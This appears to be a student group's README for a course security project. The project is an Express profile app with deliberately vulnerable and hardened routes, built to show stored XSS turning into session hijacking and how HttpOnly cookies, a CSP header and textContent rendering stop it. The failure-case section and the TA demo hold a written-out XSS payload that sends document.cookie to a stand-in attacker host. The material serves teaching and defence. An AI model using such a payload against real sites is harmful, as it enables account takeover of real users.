# ITIS 3200 Project

Group: Quis Franklin, Sean Hicks, Zaheir Carillo, Jordan Jacobs  
Course: ITIS 3200  
Date: 10/18/2026

## Who works on what

| Person | Job | Files |
|--------|-----|-------|
| Quis Franklin | Session cookie flags | `server/session/vulnerable.js`, `server/session/hardened.js`, `tests/session.test.js` |
| Sean Hicks | CSP header | `server/csp/vulnerable.js`, `server/csp/hardened.js`, `tests/csp.test.js` |
| Zaheir Carillo | Safe vs unsafe DOM rendering | `public/vulnerable/profile.js`, `public/hardened/profile.js`, `tests/render.test.js` |
| Jordan Jacobs | App wiring, README/TA demo, test harness | `server/app.js`, `server/routes.js`, `tests/helpers/app.js`, this README |

Each owned file has a header comment and `TODO(name)` markers. GitHub issues are labeled `owner:quis`, `owner:sean`, `owner:zaheir`, and `owner:jordan`. See [CONTRIBUTORS.md](CONTRIBUTORS.md).

## How to run

```bash
npm install
npm start
```

Open http://localhost:3000  
Vulnerable login: http://localhost:3000/vulnerable/login  
Hardened login: http://localhost:3000/hardened/login  

Demo accounts: `alice` / `password123`, `bob` / `password123`

```bash
npm test
```

The skeleton leaves the security pieces unfinished on purpose. Until each person finishes their TODOs, `npm test` should fail. When a member is done, their test file goes green.

## i. Chosen system description

We are building a lightweight user-profile app with Node.js, Express, HTML, and JavaScript in the browser. Users log in by submitting an HTML POST form, and Express sets a session cookie that keeps them logged in while they update and view public profiles. We need to protect the active session cookie, the user's credentials, and the link between that session and the right account. If an attacker gets the cookie, they can take over the account.

Express serves the HTML views. The login form posts the credentials, and Express issues a session cookie that the browser sends with later requests.

Users POST bio updates. Express stores the bio and serves it when a profile is opened. Client-side JavaScript renders the page and makes background `fetch()` requests.

Unsanitized bio text that includes a script tag runs in the victim's browser when the page renders. The script tries to read `document.cookie` and send it out with `fetch()`. Express stops this by setting the cookie HttpOnly and sending a CSP header, so the browser withholds the cookie and blocks the outbound `fetch()`.

## ii. Threat model and specific threat

A remote attacker with ordinary web access can submit arbitrary text, HTML, or JavaScript into public fields such as the profile bio.

We are looking at XSS that turns into session hijacking. A stored or reflected script runs in a logged-in victim's browser, reads `document.cookie`, and uses `fetch()` to send the session token to an endpoint the attacker controls. The attacker can then use the victim's account.

Server infrastructure, direct database access, and network eavesdropping are out of scope. We assume the app is served over HTTPS and that server-side access checks are still in place.

## iii. Security mechanism design

The main control is the cookie flags in the Express session options: `httpOnly: true`, `secure: true`, and `sameSite: 'strict'`. HttpOnly blocks client-side JavaScript from reading the session token through `document.cookie`.

Express also sets a CSP header, `Content-Security-Policy: default-src 'self'; script-src 'self'`. The policy blocks inline script and restricts outgoing connections to our own origin.

In the browser code, we write profile text with `element.textContent`, so user input is rendered as plain text.

## iv. Broken state vs attack state (failure case and validation plan)

Without those controls, Express sets the session cookie without the HttpOnly flag, omits the CSP header, and writes the raw bio into the DOM with `innerHTML`.

An attacker puts the following in a profile field (URL written out in full so markdown does not turn it into a link):

```
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
```

When the victim opens the page, the browser runs the script, reads `document.cookie`, and sends the live session token to the attacker's site, which is enough to hijack the account.

In the `/hardened` routes, HttpOnly hides the session token from `document.cookie` and CSP drops the unauthorized `fetch()`. This repo includes runnable `/vulnerable` and `/hardened` Express routes.

### Manual demo for the TA

1. Start the app with `npm start`.
2. Open `/vulnerable/login`, sign in as alice.
3. Paste the payload above into alice's bio and save.
4. Reload the profile. In DevTools, check that the script ran (or that `document.cookie` still shows `sid.vuln`). The vulnerable path is meant to leak the session cookie to JavaScript.
5. Repeat on `/hardened/login`. After Quis, Sean, and Zaheir finish their pieces, `document.cookie` should not expose `sid.hard`, and CSP should block the outbound steal request. Bio text should show as plain text, not as a running script.

## Project layout

```
server/
  index.js              start listening
  app.js                Jordan: mount both modes
  routes.js             Jordan: login / profile / bio API
  store.js              in-memory users
  session/              Quis
  csp/                  Sean
public/vulnerable/      Zaheir (unsafe render)
public/hardened/        Zaheir (safe render)
tests/                  one suite per owner + helpers for Jordan
```
